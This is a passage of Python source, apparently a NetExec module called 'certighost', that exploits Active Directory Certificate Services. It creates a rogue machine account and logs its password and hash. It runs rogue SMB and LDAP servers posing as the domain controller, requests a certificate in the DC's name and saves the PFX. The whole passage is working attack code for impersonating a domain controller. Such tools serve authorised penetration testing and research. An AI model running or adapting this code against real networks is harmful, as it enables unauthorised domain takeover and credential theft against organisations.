            resp = connection.search(
                searchFilter=search_filter,
                attributes=["dNSHostName", "sAMAccountName", "objectSid"],
                sizeLimit=1,
            )
        except Exception as e:
            self.context.log.fail(f"LDAP search failed: {e}")
            return None

        entries = parse_result_attributes(resp)
        if not entries:
            self.context.log.fail(err_msg)
            return None

        dc = entries[0]
        dc_sam = dc.get("sAMAccountName", "")
        dc_dns = dc.get("dNSHostName", f"{dc_sam.rstrip('$')}.{connection.domain}")
        dc_sid_str = dc.get("objectSid", "")
        if isinstance(dc_sid_str, str) and dc_sid_str.startswith("S-"):
            sid_obj = SID()
            sid_obj.fromCanonical(dc_sid_str)
            dc_sid_bin = sid_obj.getData()
        else:
            dc_sid_bin = dc_sid_str

        domain_sid = connection.sid_domain or "-".join(dc_sid_str.split("-")[:-1])

        domain_guid = b"\x00" * 16
        try:
            raw = connection.ldap_connection.search(
                searchBase=connection.baseDN,
                searchFilter="(objectClass=*)",
                attributes=["objectGUID"],
                scope=Scope("baseObject"),
            )
            rootdse_entries = parse_result_attributes(raw)
            if rootdse_entries:
                guid_val = rootdse_entries[0].get("objectGUID")
                if guid_val is not None:
                    domain_guid = guid_val if isinstance(guid_val, bytes) else guid_val.bytes
        except Exception as e:
            self.context.log.debug(f"Could not retrieve domain GUID: {e}")

        return DomainControllerInfo(
            sam=dc_sam,
            dns=dc_dns,
            cn=dc_sam.rstrip("$"),
            sid_bin=dc_sid_bin,
            domain_sid=domain_sid,
            domain_guid=domain_guid,
            domain_nb=dns_to_netbios(connection.domain),
        )

    def check_bind_capabilities(self, label, error):
        self.context.log.fail(f"Rogue {label} server failed to start: {error}")
        if isinstance(error, PermissionError):
            self.context.log.fail(f"Cannot bind privileged ports (445/389). Run: sudo setcap cap_net_bind_service=+ep {os.path.realpath(sys.executable)}")

    def select_target_ca(self, cas):
        if self.ca:
            for ca in cas:
                if self.ca.lower() in (ca["dNSHostName"].lower(), ca["ip"], ca["cn"].lower()):
                    return ca
            self.context.log.fail(f"CA '{self.ca}' not found among discovered CAs")
            return None
        return cas[0]

    def get_or_create_computer(self, connection):
        if connection.username.endswith("$"):
            comp_name = connection.username
            if connection.nthash:
                comp_hash = connection.nthash
            elif connection.password:
                comp_hash = MD4.new(connection.password.encode("utf-16-le")).hexdigest()
            else:
                self.context.log.fail("Machine account provided but no password or hash available")
                return None
            try:
                resp = connection.search(searchFilter=f"(&(objectCategory=computer)(sAMAccountName={comp_name}))", attributes=["sAMAccountName", "dNSHostName"], sizeLimit=1,)
            except Exception as e:
                self.context.log.fail(f"LDAP verification of '{comp_name}' failed: {e}")
                return None
            if not parse_result_attributes(resp):
                self.context.log.fail(f"Machine account '{comp_name}' not found in AD")
                return None
            comp_pass = connection.password or ""
            self.context.log.display(f"Using existing machine account: {comp_name}")
            return MachineAccount(name=comp_name, password=comp_pass, hash=comp_hash)

        comp_name = f"{gen_random_string(12).upper()}$"
        comp_pass = gen_random_string(16) + "Aa1"
        name_cn = comp_name.rstrip("$")
        comp_dn = f"CN={name_cn},CN=Computers,{connection.baseDN}"
        fqdn = f"{name_cn}.{connection.domain}"
        spns = [f"HOST/{name_cn}", f"HOST/{fqdn}",
                f"RestrictedKrbHost/{name_cn}", f"RestrictedKrbHost/{fqdn}"]

        self.context.log.display(f"Creating machine account: {comp_name}")
        try:
            connection.ldap_connection.add(
                comp_dn,
                ["top", "person", "organizationalPerson", "user", "computer"],
                {
                    "dnsHostName": fqdn,
                    "userAccountControl": 0x1000,
                    "servicePrincipalName": spns,
                    "sAMAccountName": comp_name,
                    "unicodePwd": f'"{comp_pass}"'.encode("utf-16-le"),
                },
            )
        except LDAPSessionError as e:
            if "entryAlreadyExists" in str(e):
                self.context.log.fail(f"Computer '{comp_name}' already exists")
            elif "insufficientAccessRights" in str(e):
                self.context.log.fail(f"Insufficient rights to add '{comp_name}'")
            elif "unwillingToPerform" in str(e):
                self.context.log.fail("Server unwilling to perform")
            elif "constraintViolation" in str(e):
                self.context.log.fail(f"Constraint violation for '{comp_name}'. Quota exceeded or password policy.")
            else:
                self.context.log.fail(f"Failed to add '{comp_name}': {e}")
            return None

        self.context.log.success(f"Created {comp_name} with password {comp_pass}")
        comp_hash = MD4.new(comp_pass.encode("utf-16-le")).hexdigest()
        return MachineAccount(name=comp_name, password=comp_pass, hash=comp_hash)

    def run_exploit(self, connection, cas):
        ca = self.select_target_ca(cas)
        if not ca:
            return

        dc_info = self.get_target_dc(connection)
        if not dc_info:
            return

        comp = self.get_or_create_computer(connection)
        if not comp:
            return

        target_label = "Target" if self.target else "DC target"
        self.context.log.highlight(f"CA: {ca['cn']} ({ca['ip']}) | {target_label}: {dc_info.sam} ({dc_info.dns})")
        for name in ("impacket", "impacket.smbserver", "impacket.dcerpc"):
            logging.getLogger(name).setLevel(logging.CRITICAL)

        servers = self.start_rogue_servers(connection, dc_info, comp)
        if not servers:
            return
        smb_state, ldap_state = servers

        try:
            self.context.log.display(f"Requesting certificate (template={self.template}, cdc={self.listener})")
            try:
                pfx_data = request_certificate(
                    ca["ip"], ca["cn"], connection.domain, comp.name, comp.hash, connection.host,
                    self.listener, dc_info.dns, self.template,
                )
            except RuntimeError as e:
                self.context.log.fail(f"Certificate enrollment failed: {e}")
                return
            except Exception as e:
                self.context.log.fail(f"RPC error during enrollment: {e}")
                return

            self.save_certificate(connection, pfx_data, dc_info.cn)
        finally:
            self.stop_rogue_servers(smb_state, ldap_state)

    def start_rogue_servers(self, connection, dc_info, comp):
        self.context.log.display("Starting rogue servers (SMB:445 + LDAP:389)")
        smb_state = RogueServerState()
        threading.Thread(
            target=run_rogue_smb, daemon=True,
            args=("0.0.0.0", 445, dc_info.domain_nb, connection.domain, connection.domain, dc_info.domain_guid,
                  dc_info.domain_sid, comp.name, comp.hash, comp.password, connection.domain, connection.host,
                  smb_state),).start()

        ldap_srv = RogueLDAP(self.context, connection.domain, dc_info.domain_nb, connection.baseDN, comp.name,
                             comp.hash, connection.domain, connection.host, dc_info.sid_bin, dc_info.dns,
                             dc_info.cn, dc_info.sam)
        ldap_state = RogueServerState()
        threading.Thread(target=ldap_srv.serve, daemon=True, args=("0.0.0.0", 389, ldap_state)).start()

        if not self.wait_for_rogue_servers(smb_state, ldap_state):
            return None
        return smb_state, ldap_state

    def wait_for_rogue_servers(self, smb_state, ldap_state, timeout=15):
        for _ in range(timeout):
            if smb_state.error:
                self.check_bind_capabilities("SMB", smb_state.error)
                return False
            if ldap_state.error:
                self.check_bind_capabilities("LDAP", ldap_state.error)
                return False
            if port_open("127.0.0.1", 445) and port_open("127.0.0.1", 389):
                return True
            time.sleep(1)
        self.context.log.fail(f"Rogue servers failed to start within {timeout}s")
        return False

    def safe_call(self, func, error_msg):
        try:
            func()
        except (OSError, RuntimeError) as e:
            self.context.log.debug(f"{error_msg}: {e}")

    def stop_rogue_servers(self, smb_state, ldap_state):
        if smb_state.server is not None:
            self.safe_call(smb_state.server.stop, "Error stopping rogue SMB server")
        if ldap_state.server is not None:
            self.safe_call(lambda: ldap_state.server.shutdown(socket.SHUT_RDWR), "Error shutting down rogue LDAP server")
            self.safe_call(ldap_state.server.close, "Error closing rogue LDAP server")

    def save_certificate(self, connection, pfx_data, target_cn):
        output_dir = os.path.join(NXC_PATH, "modules", "certighost", connection.domain)
        os.makedirs(output_dir, exist_ok=True)
        pfx_path = os.path.join(output_dir, f"{target_cn.lower()}.pfx")
        Path(pfx_path).write_bytes(pfx_data)
        self.context.log.success(f"Certificate saved to {pfx_path}")
